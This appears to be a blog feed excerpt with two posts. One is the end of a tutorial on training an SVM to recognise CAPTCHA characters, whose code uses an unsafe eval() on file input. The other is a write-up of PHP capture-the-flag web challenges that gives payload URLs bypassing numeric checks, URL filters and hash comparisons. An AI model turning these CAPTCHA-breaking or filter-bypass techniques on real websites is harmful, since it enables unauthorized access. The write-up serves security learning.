<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def get_count(path, char):</span><br><span class="line">    filepath = os.path.join(path, char, &apos;count.txt&apos;)</span><br><span class="line">    with open(filepath, &apos;r&apos;) as f:</span><br><span class="line">        cnt = eval(f.readline())</span><br><span class="line">    return cnt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_label(char):</span><br><span class="line">    global char_list</span><br><span class="line">    for i in range(0, len(char_list)):</span><br><span class="line">        if char_list[i] == char:</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_char_set(path, char):</span><br><span class="line">    cnt = get_count(path, char)</span><br><span class="line">    x = np.zeros((cnt, 264))</span><br><span class="line">    y = np.zeros((cnt, 1))</span><br><span class="line">    for i in range(1, cnt + 1):</span><br><span class="line">        filepath = os.path.join(path, char, str(i) + &apos;.png&apos;)</span><br><span class="line">        x[i - 1, :] = load_image(filepath)</span><br><span class="line">        y[i - 1] = get_label(char)</span><br><span class="line">    char_set = np.hstack((x, y))</span><br><span class="line">    return char_set</span><br><span class="line">	</span><br><span class="line">def build_sets(path):</span><br><span class="line">    global char_list</span><br><span class="line">    sets = build_char_set(path, char_list[0])</span><br><span class="line">    for i in range(1, len(char_list)):</span><br><span class="line">        char_set = build_char_set(path, char_list[i])</span><br><span class="line">        sets = np.vstack((sets, char_set))</span><br><span class="line">    return sets</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cnt = get_count(path, char)</code>通过<code>get_count()</code>函数读取相关字符目录下<code>count.txt</code>文件的数值。</li>
<li><code>x = np.zeros((cnt, 264))  y = np.zeros((cnt, 1))</code>返回来一个给定形状和类型的用0填充的数组，用<code>np.zeros</code>生成<code>(cnt,264)</code>和<code>(cnt,1)</code>的数组下<code>x</code>,<code>y</code>。</li>
<li><code>get_label()</code>函数用来读取人工标识获取的char值。<code>load_image()</code>函数用来读取文件目录下的字符。<code>for</code>循环分别填充刚刚生成的<code>y</code>,<code>x</code>数组。</li>
<li><code>np.hstack((x, y))</code>将填充的<code>y</code>,<code>x</code>数组将水平(按列顺序)把数组给堆叠起来。返回给<code>char_set</code>。</li>
<li><code>for i in range(1, len(char_list)):</code>遍历所有字符，得到所有字符的水平(按列顺序)把数组给堆叠起来的结果再用<code>sets = np.vstack((sets, char_set))</code>垂直（按照行顺序）的把数组给堆叠起来复制给<code>set</code>。</li>
</ul>
<h3><span id="配置svm模型">配置SVM模型</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def build_training_sets(sets, percent):</span><br><span class="line">    length = int(len(sets) * percent)</span><br><span class="line">    return sets[0:length, :]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_test_sets(sets, percent):</span><br><span class="line">    length = int(len(sets) * (1 - percent))</span><br><span class="line">    return sets[length:len(sets), :]</span><br></pre></td></tr></table></figure>
<ul>
<li>声明两个函数分别是<code>build_training_sets(sets, percent)</code>和<code>build_test_sets(sets, percent)</code>。这两个函数参数为<code>sets</code>和<code>percent</code>即上部分析得到的<code>sets</code>值和一个<code>百分比</code>值,用于训练集和测试集的建立。</li>
</ul>
<h3><span id="加载测试集-训练集">加载测试集、训练集</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">def train(training_sets):</span><br><span class="line">    x = training_sets[:, 0:264]</span><br><span class="line">    y = training_sets[:, 264].reshape(-1, 1)</span><br><span class="line">    clf = svm.LinearSVC()</span><br><span class="line">    clf.fit(x, y)</span><br><span class="line">    return clf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def recognize(y):</span><br><span class="line">    global char_list</span><br><span class="line">    return char_list[y]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def predict(clf, x):</span><br><span class="line">    return recognize(int(clf.predict(x)[0]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def accuracy(pred, real):</span><br><span class="line">    cnt = 0</span><br><span class="line">    for i in range(len(pred)):</span><br><span class="line">        if pred[i] == real[i]:</span><br><span class="line">            cnt = cnt + 1</span><br><span class="line">    return cnt / len(pred)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def test(clf, test_sets):</span><br><span class="line">    x = test_sets[:, 0:264]</span><br><span class="line">    y = test_sets[:, 264].reshape(-1, 1)</span><br><span class="line">    length = x.shape[1]</span><br><span class="line">    pred = []</span><br><span class="line">    real = []</span><br><span class="line">    for i in range(0, length):</span><br><span class="line">        pred.append(predict(clf, x[i, :].reshape(1, -1)))</span><br><span class="line">        real.append(recognize(int(y[i])))</span><br><span class="line">    return accuracy(pred, real)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>train(training_sets)</code>函数中<code>x</code>和<code>y</code>是用来生成训练集数据的，在后续函数可以得知。</li>
<li><code>clf = svm.LinearSVC()</code>初始化一个<code>SVM</code>模型。<code>clf.fit(x, y)</code>用<code>x</code>和<code>y</code>作为训练数据拟合模型。</li>
<li><code>predict(clf, x)</code>是预测<code>load_image()</code>函数用来读取文件目录下的字符的类函数</li>
<li><code>test(clf, test_sets)</code>函数是用来进行测试集数据处理的函数，函数中加载测试集的<code>sets</code>数据，并计算测试集精度由<code>accuracy()</code>函数返回。</li>
</ul>
<h3><span id="训练-测试并更新">训练、测试并更新</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def update_model():</span><br><span class="line">    BASE_DIR = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">    data_path = os.path.join(BASE_DIR, &apos;sets&apos;)</span><br><span class="line">    model_path = os.path.join(BASE_DIR, &apos;model&apos;, &apos;svm.model&apos;)</span><br><span class="line">    sets = build_sets(data_path)</span><br><span class="line">    for i in range(5):</span><br><span class="line">        np.random.shuffle(sets)</span><br><span class="line">    training_sets = build_training_sets(sets, 0.9)</span><br><span class="line">    test_sets = build_test_sets(sets, 0.1)</span><br><span class="line">    model = train(training_sets)</span><br><span class="line">    res = test(model, test_sets)</span><br><span class="line">    joblib.dump(model, model_path)</span><br><span class="line">    print(&apos;Model updated! The accuracy on test sets: &apos; + str(res))</span><br></pre></td></tr></table></figure>
<ul>
<li>从<code>update_model()</code>函数分析，这个函数用来更新模型的，显示加载相应的图像数据和<code>svm</code>模型。</li>
<li><code>for i in range(5):   np.random.shuffle(sets)</code>利用一个<code>for</code>循环生成5个用<code>np.random.shuffle(sets)</code>函数打乱顺序的<code>sets</code>值。</li>
<li>利用<code>training_sets = build_training_sets(sets, 0.9)</code>和<code>test_sets = build_test_sets(sets, 0.1)</code>,前面提到的两个函数创建训练集和测试集。</li>
<li><code>model = train(training_sets)</code>加载训练集，训练模型。<code>res = test(model, test_sets)</code>返回测试集的精度。</li>
<li><code>joblib.dump(model, model_path)</code>使用joblib保存模型到响应目录生成新的<code>SVM</code>模型。</li>
</ul>
<h2><span id="识别验证码">识别验证码</span></h2><h3><span id="加载-处理验证码">加载、处理验证码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def process_pic(path):</span><br><span class="line">    im = Image.open(path)</span><br><span class="line">    im = im.point(lambda i: i != 43, mode=&apos;1&apos;)</span><br><span class="line">    y_min, y_max = 0, 22  # im.height - 1 # 26</span><br><span class="line">    split_lines = [5, 17, 29, 41, 53]</span><br><span class="line">    ims = [im.crop([u, y_min, v, y_max])</span><br><span class="line">           for u, v in zip(split_lines[:-1], split_lines[1:])]</span><br><span class="line">    return ims</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def process(data):</span><br><span class="line">    for i in range(0, len(data)):</span><br><span class="line">        if(data[0][i] &gt; 0):</span><br><span class="line">            data[0][i] = 1</span><br><span class="line">    return data</span><br></pre></td></tr></table></figure>
<ul>
<li><code>process_pic()</code>函数和<code>process()</code>函数在前面<code>labeler</code>模块是出现过的，第一个函数使用来分隔验证码的，把验证码分隔成四部分。第二个函数是用来进行二值化的。</li>
</ul>
<h3><span id="识别验证码">识别验证码</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def recognize_checkcode(path):</span><br><span class="line">    model_path = r&apos;./model/svm.model&apos;</span><br><span class="line">    model = joblib.load(model_path)</span><br><span class="line">    char_list = list(&quot;0123456789abcdefghijklmnopqrstuvwxy&quot;)</span><br><span class="line">    ims = process_pic(path)</span><br><span class="line">    code = []</span><br><span class="line">    for j in range(4):</span><br><span class="line">        data = np.array(ims[j].getdata()).reshape(1, -1)</span><br><span class="line">        data = process(data)</span><br><span class="line">        code.append(predict(model, data))</span><br><span class="line">    return code[0] + code[1] + code[2] + code[3]</span><br></pre></td></tr></table></figure>
<ul>
<li><code>recognize_checkcode(path)</code>函数中，首先通过<code>joblib</code>的<code>load</code>方法，加载保存的模型。</li>
<li><code>process_pic(path)</code>分隔图片，<code>for j in range(4)</code>循环把分隔的四张图像进行二值化过程。</li>
<li><code>predict(model, data)</code>，把四张图像加入SVM模型测试。将结果利用数组的<code>append</code>方法添加到数组。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[solveme.peng.kr平台Web练习]]></title>
      <url>https://uknowsec.cn/posts/notes/solveme-peng-kr%E5%B9%B3%E5%8F%B0Web%E7%BB%83%E4%B9%A0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>最近自己的状态有点迷的，想学点代码审计的东西，又感觉自己的基础太菜。整个人昏昏沉沉的，偶尔逛freebuf看到一篇web题解的文章，</p>
<p>作者在文章提到这个网站的Web题都是PHP审计的题目，于是看看代码，一行一行看代码，一个函数一个函数的理解。也写个题解记录以下。</p>
<h2><span id="正文">正文</span></h2><h3><span id="warm-up">Warm up</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    echo base64_encode(hex2bin(strrev(bin2hex($flag)))), &apos;&lt;hr&gt;&apos;;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>第一题是解密的题目，一个函数一个函数的理解。</p>
<ul>
<li><p>bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。</p>
</li>
<li><p>strrev() 函数反转字符串。</p>
</li>
<li><p>hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。</p>
</li>
<li><p>base64_encode() 使用 MIME base64 对数据进行编码。</p>
</li>
</ul>
<p>理解函数的意思，只需要把输出值逆向回去就行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	</span><br><span class="line">	$flag = &quot;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&quot;;</span><br><span class="line">	</span><br><span class="line">    echo hex2bin(strrev(bin2hex(base64_decode($flag))));</span><br></pre></td></tr></table></figure>
<h3><span id="bad-compare">Bad compare</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;answer&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if($_GET[&apos;answer&apos;] === &apos;痤迈愈羼滋&apos;)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;Wrong answer&apos;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>以上是我用firefox浏览器打开显示的代码，我这里直接提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://badcompare.solveme.peng.kr/?answer=痤迈愈羼滋</span><br></pre></td></tr></table></figure>
<p>是可以的，但是在chrome不行。显示的值也不一样。</p>
<h3><span id="winter-sleep">Winter sleep</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;time&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(!is_numeric($_GET[&apos;time&apos;]))&#123;</span><br><span class="line">            echo &apos;The time must be number.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&apos;time&apos;] &lt; 60 * 60 * 24 * 30 * 2)&#123;</span><br><span class="line">            echo &apos;This time is too short.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if($_GET[&apos;time&apos;] &gt; 60 * 60 * 24 * 30 * 3)&#123;</span><br><span class="line">            echo &apos;This time is too long.&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            sleep((int)$_GET[&apos;time&apos;]);</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>看代码的意思是让我们输入一个5184000到7776000之间的数，才能通过判断输出$flag。</p>
<p>但是在最后他会执行sleep函数</p>
<ul>
<li>sleep() 函数延迟代码执行若干秒。</li>
</ul>
<p>这个函数需要等待很长的时间，sleep用到(int)转换为整数型</p>
<p>在PHP中做如下实验</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	</span><br><span class="line">	echo 60 * 60 * 24 * 30 * 2 ,&apos;&lt;br&gt;&apos;;		//5184000</span><br><span class="line">	</span><br><span class="line">	echo 60 * 60 * 24 * 30 * 3,&apos;&lt;br&gt;&apos;	;	//7776000</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;123abc&apos; ,&apos;&lt;br&gt;&apos;;		//123</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;1abc23&apos; ,&apos;&lt;br&gt;&apos;;			//1</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;abc123&apos; ,&apos;&lt;br&gt;&apos;;			//0</span><br><span class="line">	</span><br><span class="line">	echo 6e6 ,&apos;&lt;br&gt;&apos;;		//6000000</span><br><span class="line">	</span><br><span class="line">	echo (int)&apos;6e6&apos;;		//6</span><br></pre></td></tr></table></figure>
<p>从上面代码可以看出，(int)将字符串转换成了int型，比如第三行，将123abc输出为123，第四行把1abc23输出为1。第五行把abc123输出为123</p>
<p>这里我们就可以知道(int)只取字符串中的数字，且只取第一个出现字母前的数字。</p>
<p>所以这里我们可以用科学计数法，6e6这个刚好满足代码的逻辑。</p>
<p>sleep也之执行6秒</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload : http://wintersleep.solveme.peng.kr/?time=6e6</span><br></pre></td></tr></table></figure>
<h3><span id="hard-login">Hard login</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    session_start();</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;username&apos;], $_GET[&apos;password&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(isset($_SESSION[&apos;hard_login_check&apos;]))&#123;</span><br><span class="line">            echo &apos;Already logged in..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if(!isset($_GET[&apos;username&apos;]&#123;3&#125;) || strtolower($_GET[&apos;username&apos;]) != $hidden_username)&#123;</span><br><span class="line">            echo &apos;Wrong username..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else if(!isset($_GET[&apos;password&apos;]&#123;7&#125;) || $_GET[&apos;password&apos;] != $hidden_password)&#123;</span><br><span class="line">            echo &apos;Wrong password..&apos;;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $_SESSION[&apos;hard_login_check&apos;] = true;</span><br><span class="line">            echo &apos;Login success!&apos;;</span><br><span class="line">            header(&apos;Location: ./&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>这里看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;username&apos;]&#123;3&#125;		//取username提交参数的索引号为3的值</span><br><span class="line">	</span><br><span class="line">$_GET[&apos;password&apos;]&#123;7&#125;		//取username提交参数的索引号为7的值</span><br></pre></td></tr></table></figure>
<ul>
<li>strtolower() 函数把字符串转换为小写。</li>
</ul>
<p>满足上面代码给出的条件，最后是会跳转到根目录下。</p>
<p>那我们直接访问网站的根目录，显示是调转到/login.php的。</p>
<p>试试curl或者burpsuite试试。这里在windows下不自带curl命令的，我们可以用windows的git bash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://hardlogin.solveme.peng.kr/</span><br></pre></td></tr></table></figure>
<p>这样就可以看到根目录下的源码，发现flag</p>
<h3><span id="url-filtering">URL filtering</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&quot;/lib.php&quot;;</span><br><span class="line"></span><br><span class="line">    $url = urldecode($_SERVER[&apos;REQUEST_URI&apos;]);</span><br><span class="line">    $url_query = parse_url($url, PHP_URL_QUERY);</span><br><span class="line"></span><br><span class="line">    $params = explode(&quot;&amp;&quot;, $url_query);</span><br><span class="line">    foreach($params as $param)&#123;</span><br><span class="line"></span><br><span class="line">        $idx_equal = strpos($param, &quot;=&quot;);</span><br><span class="line">        if($idx_equal === false)&#123;</span><br><span class="line">            $key = $param;</span><br><span class="line">            $value = &quot;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $key = substr($param, 0, $idx_equal);</span><br><span class="line">            $value = substr($param, $idx_equal + 1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(strpos($key, &quot;do_you_want_flag&quot;) !== false || strpos($value, &quot;yes&quot;) !== false)&#123;</span><br><span class="line">            die(&quot;no hack&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;do_you_want_flag&apos;]) &amp;&amp; $_GET[&apos;do_you_want_flag&apos;] == &quot;yes&quot;)&#123;</span><br><span class="line">        die($flag);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码函数理解</p>
<ul>
<li>urldecode — 解码已编码的 URL 字符串</li>
<li>parse_url — 解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</li>
<li>$_SERVER[‘REQUEST_URI’] - 获取域名后面的值，包括/</li>
<li>explode - 把字符串打散为数组。 explode(separator,string,limit) separator表示在哪里分割字符串，string要分割的字符串,limit可选，规定所返回的数组元素的数目。</li>
<li>strpos - 查找字符串在另一字符串中第一次出现的位置，对大小写敏感。</li>
<li>substr - 函数返回字符串的一部分。</li>
</ul>
<p>由代码的后半部分中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&apos;do_you_want_flag&apos;]) &amp;&amp; $_GET[&apos;do_you_want_flag&apos;] == &quot;yes&quot;)&#123;</span><br><span class="line">    die($flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这里要求我们提交do_you_want_flag=yes去获取flag，但是前半部分由会判断的。</p>
<p>前半段代码中的key值最后为do_you_want_flag,value值为yes。显然是不能过判断的。</p>
<p>这里用到一个函数的漏洞，那就是parse_url()函数。当我们在url中的目前多加一个<code>/</code>时，他会返回flase。</p>
<p>这样我们就可以绕过前面的判断。例如这题。我们提交payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr//?do_you_want_flag=yes</span><br></pre></td></tr></table></figure>
<p>另解：</p>
<blockquote>
<p>URL filtering那题，其实感觉上，<code>///</code>这种解法是非预期的。</p>
<p>根据官方给出的wp，其实可以回来看到题目里有一步多余的url_decode操作，官方wp给出的解法是通过注入%23，使上下获取到的查询字串不对称，从而拿到flag，从代码看来的话，官方wp与题目中的提示更契合。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr/?%23do_you_want_flag=yes</span><br></pre></td></tr></table></figure>
<h2><span id="hash-collision">Hash collision</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    require __DIR__.&apos;/lib.php&apos;;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&apos;foo&apos;], $_GET[&apos;bar&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">        if(strlen($_GET[&apos;foo&apos;]) &gt; 30 || strlen($_GET[&apos;bar&apos;]) &gt; 30)&#123;</span><br><span class="line">            die(&apos;Too long&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($_GET[&apos;foo&apos;] === $_GET[&apos;bar&apos;])&#123;</span><br><span class="line">            die(&apos;Same value&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(hash(&apos;sha512&apos;, $_GET[&apos;foo&apos;]) !== hash(&apos;sha512&apos;, $_GET[&apos;bar&apos;]))&#123;</span><br><span class="line">            die(&apos;Different hash&apos;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        echo $flag, &apos;&lt;hr&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p>代码函数理解：</p>
<ul>
<li>strlen - 函数返回字符串的长度。</li>
<li>string hash ( string $algo , string $data [, bool $raw_output = false ] ) algo 要使用的哈希算法 data 要进行哈希运算的消息</li>
</ul>
<p>这里需要两个不同值的hash相等来通过判断，但是在PHP中可以用数组进行绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hashcollision.solveme.peng.kr/?foo[]=1&amp;bar[]=2</span><br></pre></td></tr></table></figure>
